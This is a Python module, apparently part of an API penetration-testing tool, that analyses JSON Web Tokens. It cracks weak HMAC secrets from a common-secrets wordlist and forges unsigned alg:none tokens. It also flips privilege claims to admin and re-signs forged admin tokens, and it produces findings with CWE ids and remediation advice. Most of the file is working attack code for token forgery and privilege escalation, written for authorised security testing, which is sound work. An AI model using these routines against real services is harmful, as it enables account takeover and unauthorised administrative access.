"""
JWT analysis + offline attacks (pure, unit-tested).

Implements the JWT attacks from Hacking APIs (Ball, Ch 8): decode/analyze,
the `alg:none` forge, the HMAC weak-secret crack, and forging an admin token
once the secret is known. All crypto is stdlib (hmac/hashlib); the crack runs
fully offline (no requests to the provider). tools._run_jwt optionally tests a
forged token against a scoped endpoint.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from urllib.parse import urlparse

_ALG_HASH = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}

# Common signing secrets to try first (weak-config crack).
COMMON_SECRETS = [
    "secret", "password", "changeme", "admin", "123456", "key", "jwt", "test",
    "your-256-bit-secret", "secretkey", "secret_key", "hmac", "private", "token",
    "default", "supersecret", "s3cr3t", "qwerty", "letmein", "password1", "root",
]


def b64url_decode(s: str) -> bytes:
    s = s + "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())


def b64url_encode(b) -> str:
    if isinstance(b, str):
        b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt(token: str):
    """Return {header, payload, signature, parts} or None if not a JWT."""
    parts = (token or "").strip().split(".")
    if len(parts) < 2:
        return None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except Exception:
        return None
    return {"header": header, "payload": payload,
            "signature": parts[2] if len(parts) > 2 else "", "parts": parts}


def _signing_input(parts: list) -> str:
    return parts[0] + "." + parts[1]


def sign_hs(signing_input: str, secret, alg: str = "HS256") -> str:
    h = _ALG_HASH.get(alg.upper(), hashlib.sha256)
    key = secret.encode() if isinstance(secret, str) else secret
    return b64url_encode(hmac.new(key, signing_input.encode(), h).digest())


def verify_hs(token: str, secret) -> bool:
    d = decode_jwt(token)
    if not d or len(d["parts"]) < 3:
        return False
    alg = str(d["header"].get("alg", "")).upper()
    if alg not in _ALG_HASH:
        return False
    expected = sign_hs(_signing_input(d["parts"]), secret, alg)
    return hmac.compare_digest(expected, d["parts"][2])


def candidate_secrets(payload: dict, extra: list = None) -> list:
    """Common secrets + words derived from the token's issuer/audience host."""
    words = list(COMMON_SECRETS)
    for claim in ("iss", "aud"):
        v = str(payload.get(claim, ""))
        host = urlparse(v).hostname if "://" in v else v
        root = (host or "").split(".")[0]
        if root and 2 < len(root) < 40:
            words += [root, root + "2020", root + "2021", root + "2022",
                      root + "2023", root + "2024", root.capitalize(), root + "!"]
    for w in (extra or []):
        if w and w not in words:
            words.append(w)
    return list(dict.fromkeys(words))


def crack_secret(token: str, words: list):
    """Return the signing secret if any word verifies the HMAC signature; else None.
    Only HS256/384/512 are crackable this way."""
    d = decode_jwt(token)
    if not d or str(d["header"].get("alg", "")).upper() not in _ALG_HASH:
        return None
    for w in words:
        if verify_hs(token, w):
            return w
    return None


def forge_none(payload: dict) -> str:
    """A signature-less alg:none token carrying the given payload."""
    header = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")))
    body = b64url_encode(json.dumps(payload, separators=(",", ":")))
    return f"{header}.{body}."


def forge_hs(header: dict, payload: dict, secret, alg: str = "HS256") -> str:
    h = dict(header or {})
    h["alg"] = alg
    hb = b64url_encode(json.dumps(h, separators=(",", ":")))
    pb = b64url_encode(json.dumps(payload, separators=(",", ":")))
    return f"{hb}.{pb}.{sign_hs(hb + '.' + pb, secret, alg)}"


# Privilege-ish claims worth escalating in a forged token.
_PRIV_CLAIMS = ("admin", "superadmin", "is_admin", "isAdmin", "role", "roles",
                "scope", "scopes", "privilege", "priv", "group")


def escalate_payload(payload: dict) -> dict:
    """Return a copy of the payload with privilege claims flipped up + a fresh exp."""
    out = dict(payload)
    for k in list(out.keys()):
        if k in _PRIV_CLAIMS:
            if isinstance(out[k], bool):
                out[k] = True
            elif isinstance(out[k], str):
                out[k] = "admin"
    out.setdefault("admin", True)
    if "exp" in out:
        out["exp"] = int(time.time()) + 3600
    return out


def analyze(token: str, extra_secrets: list = None) -> dict:
    """Full offline analysis. Returns {decoded, findings, cracked_secret,
    forged_none, forged_admin}."""
    d = decode_jwt(token)
    if not d:
        return {"decoded": None, "findings": [], "cracked_secret": None}
    alg = str(d["header"].get("alg", "")).lower()
    payload = d["payload"]
    findings = []

    if alg == "none" or alg == "":
        findings.append({
            "title": "JWT signed with alg:none (unsigned)", "severity": "critical",
            "target": "jwt", "description": "The token declares alg:none, so any payload is accepted unsigned.",
            "impact": "Full token forgery — impersonate any user, including admins.",
            "reproduction_steps": ["Decode the JWT", "Set the payload to an admin user", "Send with the signature removed"],
            "cwe": "CWE-347", "family": "jwt", "tags": ["jwt", "auth"],
            "remediation": "Reject alg:none; pin the expected algorithm server-side."})

    cracked = crack_secret(token, candidate_secrets(payload, extra_secrets))
    forged_none = forge_none(escalate_payload(payload))
    forged_admin = None
    if cracked:
        forged_admin = forge_hs(d["header"], escalate_payload(payload), cracked,
                                str(d["header"].get("alg", "HS256")))
        findings.append({
            "title": "JWT signing secret is weak/crackable", "severity": "high",
            "target": "jwt", "description": f"The HMAC signing secret was recovered offline: '{cracked}'.",
            "impact": "Forge valid tokens for any user (privilege escalation, account takeover).",
            "reproduction_steps": [f"Crack the HS* secret ('{cracked}')",
                                   "Re-sign a token with escalated claims", "Send it to the API"],
            "evidence": f"secret={cracked}", "cwe": "CWE-326", "family": "jwt", "tags": ["jwt", "auth"],
            "remediation": "Use a long, random, high-entropy secret (>=256-bit); rotate leaked secrets."})

    priv = [k for k in _PRIV_CLAIMS if k in payload]
    if priv and (alg == "none" or cracked):
        findings.append({
            "title": "Forgeable privilege claims in JWT", "severity": "high",
            "target": "jwt", "description": f"The payload carries privilege claims {priv} in a forgeable token.",
            "impact": "Escalate to admin by flipping these claims in a forged token.",
            "reproduction_steps": ["Forge a token with the privilege claim set to admin/true"],
            "cwe": "CWE-347", "family": "jwt", "tags": ["jwt", "auth"]})

    exp = payload.get("exp")
    if isinstance(exp, (int, float)) and exp < time.time():
        findings.append({
            "title": "JWT is expired (check server enforcement)", "severity": "low",
            "target": "jwt", "description": "The exp claim is in the past; verify the server actually rejects it.",
            "impact": "If exp is not enforced, stale/leaked tokens keep working.",
            "reproduction_steps": ["Replay the expired token", "If accepted, exp is not enforced"],
            "cwe": "CWE-613", "family": "jwt", "tags": ["jwt", "auth"]})

    return {"decoded": {"header": d["header"], "payload": payload}, "findings": findings,
            "cracked_secret": cracked, "forged_none": forged_none, "forged_admin": forged_admin}
